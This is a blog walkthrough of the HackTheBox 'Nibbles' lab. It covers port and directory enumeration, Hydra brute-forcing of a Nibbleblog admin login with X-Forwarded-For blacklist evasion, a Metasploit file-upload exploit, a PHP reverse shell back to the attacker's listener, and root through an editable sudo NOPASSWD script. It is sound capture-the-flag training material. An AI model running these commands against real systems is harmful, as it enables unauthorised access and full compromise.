# NIBBLES

[HackTheBox Nibbles Writeup](https://ethicalhacking.sh/posts/hack-the-box-nibbles/) on Cristina's blog.

Nibbles is an easy Linux box that suffers from a known vulnerability that allows you to exploit file upload that leads to a Remote Code Execution (RCE) and gives you the ability to escalate your privileges with a script that can be run as root with no password.

## Recon

In order to find vulnerabilities that can be used to gain a foothold into the server, I will enumerate for open ports and the services they are running using nmap, the web app with devtools and directories and files with Feroxbuster.

### Network Enumeration
I start with an nmap scan with versions and default scripts
`nmap -sV -sC -T4 10.10.10.75`

Some nmap scans are quick, but while nmap is running I like to go check if there's a website running. Head to your browser of choice and go to 10.10.10.75. I'll be using Firefox. There is a web app, but all it displays is "Hello world".

Open devtools by right-clicking and selecting Inspect Element. This will open up in the Inspector tab where you're able to view the source of the website. The comment "/nibbleblog/ directory. Nothing interesting here!" which tells me there is something to see here. I head over to 10.10.10.75/nibbleblog/ and find a CMS similar to Wordpress. I Google it and find it is php based. I want to enumerate the files and directories in this nibbleblog directory.

By this time, the nmap scan is done and the only interesting thing it produced is port 80 which is the website so I'll continue down that path.

### Directory Enumeration
I start the directory and file scan with Feroxbuster for response codes 200 and 301 which represent Success and Moved Permanently respectively. I only want these response codes because they are the most common status codes for successful responses and I want to avoid status codes like 404 (not found). I also add html and php extensions since I know that this is a php based CMS and all websites have html. I am using a list from SecLists, but if you are on Kali, you can use a list like /usr/share/wordlists/dirb/common.txt


`feroxbuster --url http://10.10.10.75/nibbleblog -x html,php -w ~/labs/tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -s 200 301 -d 1 --silent`

In the results, there are a few interesting files and directories that I want to look at:

http://10.10.10.75/nibbleblog/README

http://10.10.10.75/nibbleblog/admin

http://10.10.10.75/nibbleblog/admin.php

I start with the README and score: I've got a version number. This will help in searching for any known vulnerabilities. I'll be searching for nibbleblog 4.0.3 exploits.

I head over to 10.10.10.75/nibbleblog/admin and I end up in a directory listing. This is good news because it allows me to see the files and directories in the directories I visit. I can then look at the file contents and see if I find anything interesting. I look around at the files, but nothing jumps out as interesting.

I head over to 10.10.10.75/nibbleblog/admin.php and that is our admin login page.

## Searching for Known Vulnerabilities

Now it's time to look for any known vulnerabilities for nibbleblog 4.0.3.

### Finding a known vulnerability with Metasploit

Using Metasploit finds a couple of exploits, one is for Android so I ignore that, but the other one is a File Upload exploit exploit/multi/http/nibbleblog_file_upload. That is always good news.

`msfconsole`

`search nibbleblog 4.0.3`


### Finding a known vulnerability with Google

I Google "nibbleblog 4.0.3 exploit" and head to the first result: 

https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html which turns out to be perfect. It provides and explanation of the exploit along with steps to exploit it via the admin control panel.

1. Obtain Admin credentials
2. Activate My image plugin by visiting http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
3. Upload PHP shell, ignore warnings
4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php.

## Exploitation

### Brute forcing the password

I can't get past the first step because I don't have a username or password. I do a bit more looking in the file and directory scan results because ideally I prefer not to need to brute force and especially not both the username and password as that could take a while. None of the files look interesting so I check out 10.10.10.75/nibbleblog/content directory because nothing else seems like it would include anything helpful.

In the content directory there is a private directory. That sounds interesting and I head to that 10.10.10.75/nibbleblog/content/private. There are a few interesting files there so I start with config.xml hoping for a username and password, but I only find an email admin@nibbles.com which leads me to believe that the username is admin. I also check out keys.php which seems to be empty. Finally, I checkout users.xml that confirms that the username is admin, but still no password. I did not find anything else in the other directories public and tmp.

```
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

I could try to guess the password here, but that's not realistic.

A good tool for brute forcing login forms is Hydra. For Hydra I need to know what the login failure message is. I head over to 10.10.10.75/nibbleblog/admin.php, open devtools and go to the Network tab. The network tab records network requests made from the website and shows you the response among other information. I try to login with admin:admin and the response includes "Incorrect username or password". I have the username, so I only need to use a wordlist for the password.

`hydra -l admin -P ~/labs/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^&Login=Login:Incorrect username or password"`

When I run Hydra, I have interesting results, several passwords return successful, but that's not possible for the same username.

```
[80][http-post-form] host: 10.10.10.75   login: admin   password: 1234567
[80][http-post-form] host: 10.10.10.75   login: admin   password: password
[80][http-post-form] host: 10.10.10.75   login: admin   password: lovely
[80][http-post-form] host: 10.10.10.75   login: admin   password: babygirl
[80][http-post-form] host: 10.10.10.75   login: admin   password: jessica
[80][http-post-form] host: 10.10.10.75   login: admin   password: monkey
1 of 1 target successfully completed, 6 valid passwords found
```

I was a bit confused, but I went to the browser and tried the first 5 of these passwords and I ended up getting and error message: "Nibbleblog security error - Blacklist protection". I remember seeing "blacklist" in the users.xml file and when I go back there, my IP has been blacklisted. Luckily the blacklist only lasts a few minutes.

```
<blacklist type="string" ip="10.10.14.31">
<date type="integer">1625452331</date>
<fail_count type="integer">5</fail_count>
</blacklist>
```

I was wondering if there was a way to spoof the IP address so that each password that was tested would be testing with a different IP address and search if Hydra happened to have such a feature. I didn't find anything. I Googled
"spoof request ip" and ran into https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address where I learned about a request header X-Forwarded-For.

If a server trusts that header, then it will accept the requests as if it is coming from different IPs. I looked at Burp Suite Intruder, but I couldn't find a way to randomize IP addresses. I'm a software engineer by day so I decided to write a Node script that creates a random IP and assigns it to the X-Forwarded-For header in each request. That produced the password: nibbles. I tried that on the admin page and admin:nibbles works.


## Getting a foothold with Metasploit

`msfconsole`

I press up to get the search result again and use the file upload exploit and I am warned that I do not have a payload set. I want to use a better payload for a reverse shell and set generic/shell_reverse_tcp

```
use exploit/multi/http/nibbleblog_file_upload
set payload generic/shell_reverse_tcp
```

I then need to know what options are required to use this exploit and set those options. The RHOSTS is the IP for your HTB box and the LHOST is the IP address given to your machine for HTB. You can find that with sudo ifconfig and finding the IP address assigned for tun0, but you can just set tun0 for the LHOST to save some time. The LPORT can be any port that is not already in use.

```
show options
set TARGETURI /nibbleblog
set RHOSTS 10.10.10.75
set USERNAME admin
set PASSWORD nibbles
set LHOST tun0
set LPORT 1234
exploit
```
The connection succeeded

[*] Started reverse TCP handler on 10.10.14.31:4444 
[*] Command shell session 1 opened (10.10.14.31:4444 -> 10.10.10.75:49290) at 2021-07-04 23:06:34 -0400
[+] Deleted image.php

Now that I am in I check who I am and list the contents of my user's home directory where I find the user flag.

```
id
ls ~
personal.zip user.txt
cat ~/user.txt
```
I could continue in Metasploit, but I'm going to switch to using a reverse shell instead for the privilege escalation.

Press Ctrl+C and type y to about the Meterpreter session.

## Popping a shell

For PHP, my go to reverse shell script is The PentestMonkey PHP Reverse Shell. You can download it with wget at the URL for the raw script file on Github.

`wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`

I update the IP address and port on the script and then use that same port for the netcat listener. 

`nc -lvnp 1234`

It's time to upload our reverse shell via the admin control panel. I go to follow the instructions from the CVE POC:
1. Go to http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
2. Upload php-reverse-shell.php
3. Go to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php

I see some noise on my netcat listener pane and I'm in. I set up a TTY shell because without it some things just won't work well or at all like Vim or the clear command. Usually I'd use the python command, but that was not available, but python 3 was.

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Press Ctrl+Z

```
echo $TERM
stty size
stty raw -echo; fg
```
Press Enter twice

``
export TERM=xterm-256color #(value after = should match what you got after echo $TERM)
stty rows 60 columns 116 #(values for rows and columns should match what you go for stty size)
``

## Privilege Escalation

### Becoming root

To find out what openings I have for privilege escalation on the box, I use the Linux Smart Enumeration script. I tried to download it with cURL and wget but they could not resolve the GitHub address, so I manually copied the contents of the file from https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh and then use Vim to create the file, set the permissions and run the script.

```
vim lse.sh
chmod +x lse.sh
./lse.sh -l 1
```

The script shows that I can run the monitor.sh as root without a password.

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The monitor.sh file is contained within a zip file. I unzip it, change to the personal stuff directory and check out the permissions on the contents. My user nibbler has permissions to read, write and execute.

```
unzip personal.zip
cd ~/personal/stuff
ls -la
```

Because this file can be run as root without a password I can change the contents to run the bash command and become the root user and get the root flag.

```
echo '#!/bin/bash' > monitor.sh
echo 'bash' >> monitor.sh
sudo ./monitor.sh
id
cat /root/root.txt
```
